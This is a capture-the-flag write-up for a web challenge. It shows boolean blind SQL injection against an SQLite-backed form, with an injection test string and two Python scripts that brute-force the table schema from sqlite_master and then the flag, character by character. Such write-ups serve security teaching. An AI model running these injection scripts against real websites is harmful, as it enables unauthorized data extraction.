# Amy The Hedgehog
![](https://img.shields.io/badge/category-web-blue)
![](https://img.shields.io/badge/solves-80-orange)

## Description
Hi guys! I just learned sqlite3 build my own websiteeee. Come visit my [my website](http://litctf.live:31770/) pleaseeee i am ami the dhedghog!!! :3 ( ◡‿◡ *)

## Solution
Checking out the website, it's just a simple text input. The question does mention sqlite3, suggesting a SQL injection attack.

Indeed, the inputs `a` and `a' or 1=1--` trigger different results.

![image](https://user-images.githubusercontent.com/62577178/182046557-06d15999-7743-4fa8-97dd-33cb8516f6c5.png)
![image](https://user-images.githubusercontent.com/62577178/182046550-411e6222-e7eb-4f56-ad98-fd5a0f217e0e.png)

It seems like when the query returns at least 1 record (i.e. it is true), we get the second response. If it's false, we get the first response. Using this knowledge, we can run a boolean SQL injection attack.

The likely commands that were issued to create this database are:
```sql
CREATE TABLE table_name (field_name text, ...optional fields);
INSERT INTO table_name (field_name, ...optionals) VALUES("flag", ...optionals);
```

We first need to enumerate the SQL query used to create the table. Because the question says that the database backend is sqlite3, the SQL used to create every table is stored in the `sql` field of `sqlite_master`.

```py
import requests

url = "http://litctf.live:31770/"

sql = ""
j = len(sql)+1
while True:
 for i in range(ord(' '), 128):
  print(sql+chr(i))
  inj = f"a' UNION SELECT sql FROM sqlite_master WHERE substr(sql, {j}, 1)='{chr(i)}'--"
  data = {"name": inj}
  res = requests.post(url, data=data)
  if 'correct' in res.text:
    sql += chr(i)
    j += 1
```
This reveals that the table was created with `CREATE TABLE names (name text)`.

From here, we can modify the script a little bit to have it leak the flag from the `names` table.

```py
import requests

url = "http://litctf.live:31770/"

flag = "LITCTF{"
j = len(flag)+1
while True:
 for i in range(ord(' '), 128):
  print(flag+chr(i))
  inj = f"a' UNION SELECT name FROM names WHERE substr(name, {j}, 1)='{chr(i)}'--"
  data = {"name": inj}
  res = requests.post(url, data=data)
  if 'correct' in res.text:
    flag += chr(i)
    j += 1
 ```

Flag: `LITCTF{sldjf}`
